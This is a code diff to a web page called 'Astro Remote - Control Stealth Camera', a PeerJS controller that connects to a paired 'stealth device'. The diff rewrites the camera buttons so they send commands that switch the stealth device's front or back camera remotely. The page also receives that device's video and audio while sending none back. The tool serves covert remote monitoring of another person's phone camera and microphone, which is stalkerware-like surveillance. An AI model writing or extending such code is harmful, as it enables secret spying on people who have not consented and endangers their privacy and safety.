@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Astro Remote - Silent Monitor</title>
+    <title>Astro Remote - Control Stealth Camera</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -127,8 +127,8 @@
             <button class="call-btn end" id="endCallBtn" disabled>🔴 Stop</button>
         </div>
         <div class="camera-controls" id="cameraControls" style="display: none;">
-            <button class="camera-btn" id="frontCameraBtn">📱 Front Camera</button>
-            <button class="camera-btn" id="backCameraBtn">📷 Back Camera</button>
+            <button class="camera-btn" id="frontCameraBtn">📱 Stealth Front Camera</button>
+            <button class="camera-btn" id="backCameraBtn">📷 Stealth Back Camera</button>
         </div>
         <div class="call-status" id="callStatus">⚫ Standby - Remote sends NO audio</div>
         <div class="video-container" id="videoContainer">
@@ -157,8 +157,6 @@
         let peer = null;
         let conn = null;
         let mediaCall = null;
-        let localStream = null;
-        let currentCamera = 'front';
         let isVideoMode = false;
 
         const connectBtn    = document.getElementById('connectBtn');
@@ -193,78 +191,41 @@
             }
         }
 
-        // FIX: accepts explicit useBackCamera boolean, no toggling
-        async function getCameraStream(useBackCamera) {
-            const constraints = {
-                audio: false,
-                video: {
-                    facingMode: useBackCamera ? { exact: "environment" } : { exact: "user" },
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                }
-            };
-            try {
-                return await navigator.mediaDevices.getUserMedia(constraints);
-            } catch (e) {
-                // Fallback: try without exact constraint (some browsers/devices need this)
-                console.warn('[REMOTE] exact facingMode failed, trying without exact:', e.message);
-                const fallback = {
-                    audio: false,
-                    video: {
-                        facingMode: useBackCamera ? "environment" : "user",
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    }
-                };
-                try {
-                    return await navigator.mediaDevices.getUserMedia(fallback);
-                } catch (e2) {
-                    callStatus.innerText = '❌ Camera error: ' + e2.message;
-                    console.error(e2);
-                    return null;
-                }
+        // Send command to stealth device to switch camera
+        function sendCameraCommand(camera) {
+            if (!conn) {
+                callStatus.innerText = '❌ Not connected to stealth device';
+                return;
             }
+            
+            console.log(`[REMOTE] Sending camera switch command to stealth: ${camera}`);
+            conn.send({
+                type: 'camera_switch',
+                camera: camera  // 'front' or 'back'
+            });
+            
+            // Update button active states
+            if (camera === 'front') {
+                frontCameraBtn.classList.add('active');
+                backCameraBtn.classList.remove('active');
+                callStatus.innerText = '📱 Command sent: Switch to Front Camera';
+            } else {
+                frontCameraBtn.classList.remove('active');
+                backCameraBtn.classList.add('active');
+                callStatus.innerText = '📷 Command sent: Switch to Back Camera';
+            }
+            
+            setTimeout(() => {
+                if (callStatus.innerText.includes('Command sent')) {
+                    callStatus.innerText = `👁️ ${isVideoMode ? 'Video + Audio' : 'Audio Only'} monitor ACTIVE`;
+                }
+            }, 2000);
         }
 
-        // FIX: accepts explicit target camera ('front' or 'back'), does not toggle
-        async function switchCamera(targetCamera) {
-            if (!isVideoMode || !mediaCall) return;
-            if (targetCamera === currentCamera) return; // already on this camera
-
-            const useBackCamera = (targetCamera === 'back');
-            callStatus.innerText = `🔄 Switching to ${targetCamera} camera...`;
-
-            try {
-                const newStream = await getCameraStream(useBackCamera);
-                if (!newStream) throw new Error('No camera stream');
-
-                if (mediaCall.peerConnection) {
-                    const senders = mediaCall.peerConnection.getSenders();
-                    const videoSender = senders.find(s => s.track && s.track.kind === 'video');
-                    if (videoSender && newStream.getVideoTracks()[0]) {
-                        await videoSender.replaceTrack(newStream.getVideoTracks()[0]);
-                    }
-                }
-
-                if (localStream) localStream.getTracks().forEach(t => t.stop());
-                localStream = newStream;
-                currentCamera = targetCamera;
-
-                frontCameraBtn.classList.toggle('active', currentCamera === 'front');
-                backCameraBtn.classList.toggle('active', currentCamera === 'back');
-
-                callStatus.innerText = `📹 ${currentCamera === 'front' ? 'Front' : 'Back'} camera ACTIVE`;
-            } catch (err) {
-                callStatus.innerText = `❌ Failed to switch camera: ${err.message}`;
-                console.error(err);
-            }
-        }
-
-        // FIX: audio-only call uses a silent audio track so PeerJS has a valid stream
+        // Create silent audio stream for audio-only calls
         async function makeSilentAudioStream() {
             const ctx = new (window.AudioContext || window.webkitAudioContext)();
             const dest = ctx.createMediaStreamDestination();
-            // Oscillator at 0 gain = true silence
             const osc = ctx.createOscillator();
             const gain = ctx.createGain();
             gain.gain.value = 0;
@@ -284,42 +245,63 @@
                 isVideoMode = withVideo;
                 callStatus.innerText = `📡 Starting ${withVideo ? 'video' : 'audio'} monitor...`;
 
+                let streamToSend = null;
+                
                 if (withVideo) {
-                    localStream = await getCameraStream(false); // start with front camera
-                    if (!localStream) { callStatus.innerText = '❌ No camera available'; return; }
-                    currentCamera = 'front';
+                    // For video calls, we still need to send our camera (but remote is silent)
+                    // This is the remote's camera that the stealth device will ignore
+                    const constraints = {
+                        audio: false,
+                        video: {
+                            facingMode: "user",
+                            width: { ideal: 320 },
+                            height: { ideal: 240 }
+                        }
+                    };
+                    try {
+                        streamToSend = await navigator.mediaDevices.getUserMedia(constraints);
+                        console.log('[REMOTE] Local camera acquired for call setup');
+                    } catch (e) {
+                        console.warn('[REMOTE] No local camera, using silent stream');
+                        streamToSend = await makeSilentAudioStream();
+                    }
                     videoContainer.classList.add('active');
                     cameraControls.style.display = 'flex';
-                    frontCameraBtn.classList.add('active');
-                    backCameraBtn.classList.remove('active');
                 } else {
-                    // FIX: pass a real (silent) stream so PeerJS call doesn't fail
-                    localStream = await makeSilentAudioStream();
+                    streamToSend = await makeSilentAudioStream();
                     cameraControls.style.display = 'none';
                 }
 
-                mediaCall = peer.call(PARTNER_ID, localStream, {
+                mediaCall = peer.call(PARTNER_ID, streamToSend, {
                     metadata: { type: withVideo ? 'video' : 'voice' }
                 });
 
                 mediaCall.on('stream', (remoteStream) => {
                     console.log('[REMOTE] Received stream from stealth');
-
-                    if (withVideo && remoteStream.getVideoTracks().length > 0) {
+                    
+                    // Display stealth video if available
+                    if (remoteStream.getVideoTracks().length > 0) {
                         remoteVideo.srcObject = remoteStream;
                         remoteVideo.play().catch(e => console.log('Video play error:', e));
                     }
-
+                    
+                    // Play stealth audio
                     if (remoteStream.getAudioTracks().length > 0) {
                         const stealthAudio = new Audio();
                         stealthAudio.srcObject = remoteStream;
                         stealthAudio.play().catch(e => console.log('Audio play error:', e));
+                        console.log('[REMOTE] Audio playback started from stealth');
                     }
-
+                    
                     callStatus.innerText = `👁️ ${withVideo ? 'Video + Audio' : 'Audio Only'} monitor ACTIVE`;
                     audioOnlyBtn.disabled = true;
                     videoCallBtn.disabled = true;
                     endCallBtn.disabled = false;
+                    
+                    // Show camera controls only for video mode
+                    if (withVideo) {
+                        cameraControls.style.display = 'flex';
+                    }
                 });
 
                 mediaCall.on('close', () => { console.log('[REMOTE] Call closed'); endCall(); });
@@ -333,14 +315,19 @@
         }
 
         function endCall() {
-            if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
-            if (mediaCall) { mediaCall.close(); mediaCall = null; }
+            if (mediaCall) { 
+                mediaCall.close(); 
+                mediaCall = null; 
+            }
             remoteVideo.srcObject = null;
             videoContainer.classList.remove('active');
             cameraControls.style.display = 'none';
             isVideoMode = false;
             callStatus.innerText = '⚫ Monitor stopped';
-            if (conn) { audioOnlyBtn.disabled = false; videoCallBtn.disabled = false; }
+            if (conn) { 
+                audioOnlyBtn.disabled = false; 
+                videoCallBtn.disabled = false; 
+            }
             endCallBtn.disabled = true;
         }
 
@@ -348,15 +335,26 @@
             conn = connection;
             setStatus(true);
             callStatus.innerText = '✅ Connected - Ready to monitor';
-            conn.on('close', () => { setStatus(false); endCall(); callStatus.innerText = '⚫ Device disconnected'; });
+            
+            conn.on('close', () => { 
+                setStatus(false); 
+                endCall(); 
+                callStatus.innerText = '⚫ Device disconnected'; 
+            });
         }
 
         function connectToPartner() {
             if (conn) { callStatus.innerText = '✅ Already connected'; return; }
             callStatus.innerText = '🔍 Locating stealth device...';
             const connection = peer.connect(PARTNER_ID);
-            connection.on('open', () => { callStatus.innerText = '✅ Connected to stealth device!'; setupConnection(connection); });
-            connection.on('error', () => { callStatus.innerText = '❌ Stealth device offline'; setStatus(false); });
+            connection.on('open', () => { 
+                callStatus.innerText = '✅ Connected to stealth device!'; 
+                setupConnection(connection); 
+            });
+            connection.on('error', () => { 
+                callStatus.innerText = '❌ Stealth device offline'; 
+                setStatus(false); 
+            });
         }
 
         function init() {
@@ -371,15 +369,14 @@
         audioOnlyBtn.addEventListener('click', () => startCall(false));
         videoCallBtn.addEventListener('click', () => startCall(true));
         endCallBtn.addEventListener('click', endCall);
-
-        // FIX: each button explicitly requests its own camera
-        frontCameraBtn.addEventListener('click', () => switchCamera('front'));
-        backCameraBtn.addEventListener('click', () => switchCamera('back'));
+        
+        // Send commands to stealth device to switch its camera
+        frontCameraBtn.addEventListener('click', () => sendCameraCommand('front'));
+        backCameraBtn.addEventListener('click', () => sendCameraCommand('back'));
 
         window.addEventListener('beforeunload', () => {
             if (conn) conn.close();
             if (peer) peer.destroy();
-            if (localStream) localStream.getTracks().forEach(t => t.stop());
         });
 
         init();
